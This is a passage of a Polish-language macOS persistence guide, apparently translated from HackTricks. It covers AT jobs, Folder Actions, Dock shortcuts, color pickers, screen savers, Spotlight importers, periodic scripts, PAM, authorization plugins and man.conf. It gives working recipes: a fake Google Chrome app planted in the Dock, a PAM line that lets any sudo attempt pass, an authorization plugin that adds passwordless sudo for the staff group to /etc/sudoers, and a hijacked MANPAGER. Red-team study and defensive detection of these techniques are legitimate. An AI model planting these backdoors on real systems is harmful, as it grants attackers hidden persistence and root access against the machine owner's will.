Powyżej widzimy dwa zaplanowane zadania. Możemy wydrukować szczegóły zadania, używając `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Jeśli zadania AT nie są włączone, utworzone zadania nie będą wykonywane.

Pliki **zadania** można znaleźć w `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Nazwa pliku zawiera kolejkę, numer zadania i czas, w którym ma być uruchomione. Na przykład przyjrzyjmy się `a0001a019bdcd2`.

- `a` - to jest kolejka
- `0001a` - numer zadania w systemie szesnastkowym, `0x1a = 26`
- `019bdcd2` - czas w systemie szesnastkowym. Reprezentuje minuty, które upłynęły od epoki. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Jeśli pomnożymy to przez 60, otrzymujemy `1619509560`, co odpowiada `GMT: 2021. April 27., Tuesday 7:46:00`.

Jeśli wydrukujemy plik zadania, odkryjemy, że zawiera te same informacje, które uzyskaliśmy za pomocą `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz być w stanie wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`**, aby skonfigurować Folder Actions
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ma podstawowe uprawnienia TCC, takie jak Pulpit, Dokumenty i Pobrane

#### Lokalizacja

- **`/Library/Scripts/Folder Action Scripts`**
- Wymagane uprawnienia roota
- **Wyzwalacz**: Dostęp do określonego folderu
- **`~/Library/Scripts/Folder Action Scripts`**
- **Wyzwalacz**: Dostęp do określonego folderu

#### Opis i Eksploatacja

Folder Actions to skrypty automatycznie uruchamiane przez zmiany w folderze, takie jak dodawanie, usuwanie elementów lub inne działania, takie jak otwieranie lub zmiana rozmiaru okna folderu. Te działania mogą być wykorzystywane do różnych zadań i mogą być uruchamiane na różne sposoby, na przykład za pomocą interfejsu Finder lub poleceń terminala.

Aby skonfigurować Folder Actions, masz opcje takie jak:

1. Tworzenie przepływu pracy Folder Action za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalowanie go jako usługi.
2. Ręczne dołączenie skryptu za pomocą ustawień Folder Actions w menu kontekstowym folderu.
3. Wykorzystanie OSAScript do wysyłania wiadomości Apple Event do `System Events.app` w celu programowego skonfigurowania Folder Action.
- Ta metoda jest szczególnie przydatna do osadzenia akcji w systemie, oferując poziom trwałości.

Poniższy skrypt jest przykładem tego, co może być wykonane przez Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Aby uczynić powyższy skrypt użytecznym dla Folder Actions, skompiluj go za pomocą:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Po skompilowaniu skryptu, skonfiguruj Folder Actions, wykonując poniższy skrypt. Ten skrypt włączy Folder Actions globalnie i szczegółowo przypnie wcześniej skompilowany skrypt do folderu Pulpit.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Uruchom skrypt konfiguracyjny za pomocą:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- To jest sposób na wdrożenie tej persystencji za pomocą GUI:

To jest skrypt, który zostanie wykonany:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompiluj to za pomocą: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś to do:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz obserwować** i wybierz w swoim przypadku **`folder.scpt`** (w moim przypadku nazwałem to output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, jeśli otworzysz ten folder za pomocą **Findera**, twój skrypt zostanie wykonany.

Ta konfiguracja została zapisana w **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** w formacie base64.

Teraz spróbujmy przygotować tę persistencję bez dostępu do GUI:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby go zabezpieczyć:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** Folder Actions, które właśnie ustawiłeś:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Teraz, gdy mamy puste środowisko

3. Skopiuj plik kopii zapasowej: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz Folder Actions Setup.app, aby zastosować tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> I to nie zadziałało dla mnie, ale to są instrukcje z opisu:(

### Skróty Dock

Opis: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz mieć zainstalowaną złośliwą aplikację w systemie
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `~/Library/Preferences/com.apple.dock.plist`
- **Wyzwalacz**: Gdy użytkownik kliknie na aplikację w docku

#### Opis i Eksploatacja

Wszystkie aplikacje, które pojawiają się w Docku, są określone w plist: **`~/Library/Preferences/com.apple.dock.plist`**

Możliwe jest **dodanie aplikacji** tylko za pomocą:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Używając pewnych **techniki inżynierii społecznej**, możesz **podszyć się na przykład pod Google Chrome** w docku i faktycznie wykonać swój własny skrypt:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Wybieracze kolorów

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
- Musi się zdarzyć bardzo specyficzna akcja
- Zakończysz w innej piaskownicy
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/Library/ColorPickers`
- Wymagane uprawnienia roota
- Wyzwalacz: Użyj wybieracza kolorów
- `~/Library/ColorPickers`
- Wyzwalacz: Użyj wybieracza kolorów

#### Opis i Eksploatacja

**Skompiluj pakiet** wybieracza kolorów z własnym kodem (możesz użyć [**tego na przykład**](https://github.com/viktorstrate/color-picker-plus)) i dodaj konstruktor (jak w sekcji [Wygaszacz ekranu](macos-auto-start-locations.md#screen-saver)) i skopiuj pakiet do `~/Library/ColorPickers`.

Następnie, gdy wybieracz kolorów zostanie wyzwolony, twój kod również powinien się uruchomić.

Zauważ, że binarny plik ładujący twoją bibliotekę ma **bardzo restrykcyjną piaskownicę**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Przydatne do obejścia sandbox: **Nie, ponieważ musisz uruchomić swoją własną aplikację**
- Obejście TCC: ???

#### Lokalizacja

- Konkretna aplikacja

#### Opis i Eksploatacja

Przykład aplikacji z rozszerzeniem Finder Sync [**można znaleźć tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą mieć `Finder Sync Extensions`. To rozszerzenie będzie działać w aplikacji, która zostanie uruchomiona. Ponadto, aby rozszerzenie mogło wykonać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi być **sandboxed** (chociaż mogą być dodane luźniejsze wyjątki) i musi być zarejestrowane w czymś takim jak:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Wygaszacz ekranu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
- Ale skończysz w wspólnej piaskownicy aplikacji
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/System/Library/Screen Savers`
- Wymagane uprawnienia roota
- **Wyzwalacz**: Wybierz wygaszacz ekranu
- `/Library/Screen Savers`
- Wymagane uprawnienia roota
- **Wyzwalacz**: Wybierz wygaszacz ekranu
- `~/Library/Screen Savers`
- **Wyzwalacz**: Wybierz wygaszacz ekranu

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i Eksploatacja

Utwórz nowy projekt w Xcode i wybierz szablon do generowania nowego **Wygaszacza ekranu**. Następnie dodaj swój kod, na przykład poniższy kod do generowania logów.

**Zbuduj** go i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i po prostu na niego kliknij, powinno to wygenerować wiele logów:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Zauważ, że ponieważ wewnątrz uprawnień binarnego pliku, który ładuje ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), możesz znaleźć **`com.apple.security.app-sandbox`**, będziesz **wewnątrz wspólnego piaskownicy aplikacji**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
- Ale skończysz w piaskownicy aplikacji
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
- Piaskownica wydaje się bardzo ograniczona

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
- `/Library/Spotlight/`
- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
- Wymagane uprawnienia roota
- `/System/Library/Spotlight/`
- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
- Wymagane uprawnienia roota
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
- Wymagana nowa aplikacja

#### Description & Exploitation

Spotlight to wbudowana funkcja wyszukiwania w macOS, zaprojektowana w celu zapewnienia użytkownikom **szybkiego i kompleksowego dostępu do danych na ich komputerach**.\
Aby ułatwić tę szybką zdolność wyszukiwania, Spotlight utrzymuje **własną bazę danych** i tworzy indeks poprzez **analizowanie większości plików**, co umożliwia szybkie wyszukiwanie zarówno po nazwach plików, jak i ich zawartości.

Podstawowy mechanizm Spotlight obejmuje centralny proces nazwany 'mds', co oznacza **'serwer metadanych'.** Proces ten koordynuje całą usługę Spotlight. Uzupełniają go liczne demony 'mdworker', które wykonują różnorodne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Te zadania są możliwe dzięki wtyczkom importera Spotlight, czyli **".mdimporter bundles"**, które umożliwiają Spotlight zrozumienie i indeksowanie zawartości w różnych formatach plików.

Wtyczki lub **`.mdimporter`** bundles znajdują się w wcześniej wspomnianych miejscach, a jeśli pojawi się nowy bundle, jest ładowany w ciągu minuty (nie ma potrzeby ponownego uruchamiania żadnej usługi). Te bundle muszą wskazywać, które **typy plików i rozszerzenia mogą obsługiwać**, w ten sposób Spotlight będzie ich używać, gdy zostanie utworzony nowy plik z wskazanym rozszerzeniem.

Możliwe jest **znalezienie wszystkich `mdimporters`** załadowanych w trakcie działania:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
A na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** jest używane do analizowania tego typu plików (rozszerzenia `.iba` i `.book` oraz innych):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Jeśli sprawdzisz Plist innych `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. To dlatego, że jest to wbudowany _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nie trzeba określać rozszerzeń.
>
> Ponadto, domyślne wtyczki systemowe zawsze mają pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są w inny sposób indeksowane przez własne `mdimporters` Apple.

Aby stworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) i następnie zmienić nazwę, **`CFBundleDocumentTypes`** oraz dodać **`UTImportedTypeDeclarations`**, aby obsługiwał rozszerzenie, które chcesz wspierać i odzwierciedlić je w **`schema.xml`**.\
Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonać swój ładunek, gdy plik z przetworzonym rozszerzeniem zostanie utworzony.

Na koniec **zbuduj i skopiuj swój nowy `.mdimporter`** do jednej z wcześniejszych lokalizacji i możesz sprawdzić, czy jest ładowany **monitorując logi** lub sprawdzając **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Nie wygląda na to, że to już działa.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Wymaga konkretnej akcji użytkownika
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Nie wygląda na to, że to już działa.

## Obejście Sandbox Root

> [!TIP]
> Tutaj możesz znaleźć lokalizacje startowe przydatne do **obejścia sandbox**, które pozwala na proste wykonanie czegoś przez **zapisanie go w pliku** będąc **rootem** i/lub wymagając inne **dziwne warunki.**

### Okresowe

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być rootem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Wymagany root
- **Wyzwalacz**: Gdy nadejdzie czas
- `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
- Wymagany root
- **Wyzwalacz**: Gdy nadejdzie czas

#### Opis i Eksploatacja

Skrypty okresowe (**`/etc/periodic`**) są wykonywane z powodu **demonów uruchamiających** skonfigurowanych w `/System/Library/LaunchDaemons/com.apple.periodic*`. Zauważ, że skrypty przechowywane w `/etc/periodic/` są **wykonywane** jako **właściciel pliku**, więc to nie zadziała w przypadku potencjalnego podniesienia uprawnień.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Istnieją inne skrypty okresowe, które będą wykonywane, wskazane w **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Jeśli uda ci się napisać którykolwiek z plików `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`, zostanie on **wykonany prędzej czy później**.

> [!WARNING]
> Zauważ, że skrypt okresowy będzie **wykonywany jako właściciel skryptu**. Więc jeśli zwykły użytkownik jest właścicielem skryptu, zostanie on wykonany jako ten użytkownik (może to zapobiec atakom eskalacji uprawnień).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być rootem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Root zawsze wymagany

#### Opis i Eksploatacja

Ponieważ PAM jest bardziej skoncentrowany na **utrzymywaniu** i złośliwym oprogramowaniu niż na łatwym wykonywaniu w macOS, ten blog nie poda szczegółowego wyjaśnienia, **przeczytaj writeupy, aby lepiej zrozumieć tę technikę**.

Sprawdź moduły PAM za pomocą:
```bash
ls -l /etc/pam.d
```
Technika utrzymywania/eskalacji uprawnień wykorzystująca PAM jest tak prosta, jak modyfikacja modułu /etc/pam.d/sudo, dodając na początku linię:
```bash
auth       sufficient     pam_permit.so
```
Więc to będzie **wyglądać** mniej więcej tak:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
I dlatego każda próba użycia **`sudo` zadziała**.

> [!CAUTION]
> Zauważ, że ten katalog jest chroniony przez TCC, więc jest bardzo prawdopodobne, że użytkownik otrzyma monit o dostęp.

Innym dobrym przykładem jest su, gdzie możesz zobaczyć, że również możliwe jest przekazywanie parametrów do modułów PAM (i możesz również wprowadzić backdoora do tego pliku):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Wtyczki autoryzacji

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być rootem i wykonać dodatkowe konfiguracje
- Obejście TCC: ???

#### Lokalizacja

- `/Library/Security/SecurityAgentPlugins/`
- Wymagany root
- Konieczne jest również skonfigurowanie bazy danych autoryzacji, aby używała wtyczki

#### Opis i eksploatacja

Możesz stworzyć wtyczkę autoryzacji, która będzie wykonywana, gdy użytkownik się loguje, aby utrzymać persistencję. Aby uzyskać więcej informacji na temat tego, jak stworzyć jedną z tych wtyczek, sprawdź wcześniejsze opisy (i bądź ostrożny, źle napisana może zablokować dostęp i będziesz musiał oczyścić swojego maca w trybie odzyskiwania).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Przenieś** pakiet do lokalizacji, w której ma być załadowany:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na koniec dodaj **zasadę** do załadowania tego wtyczki:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm autoryzacji**. Ponadto, **`privileged`** spowoduje, że zostanie on wykonany przez root.

Wywołaj to za pomocą:
```bash
security authorize com.asdf.asdf
```
A następnie **grupa pracowników powinna mieć dostęp sudo** (przeczytaj `/etc/sudoers`, aby potwierdzić).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być rootem, a użytkownik musi używać man
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/private/etc/man.conf`**
- Wymagany root
- **`/private/etc/man.conf`**: Kiedy man jest używany

#### Opis i Eksploatacja

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binarny/skrypt do użycia podczas otwierania plików dokumentacji man. Ścieżka do wykonywalnego pliku może być zmodyfikowana, więc za każdym razem, gdy użytkownik używa man do przeglądania dokumentów, uruchamiana jest tylna furtka.

Na przykład ustawione w **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
A następnie utwórz `/tmp/view` jako:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być rootem, a apache musi być uruchomiony
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd nie ma uprawnień

#### Location

- **`/etc/apache2/httpd.conf`**
- Wymagany root
- Wyzwalacz: Gdy Apache2 jest uruchamiany

#### Description & Exploit

Możesz wskazać w `/etc/apache2/httpd.conf`, aby załadować moduł, dodając linię taką jak:
```bash
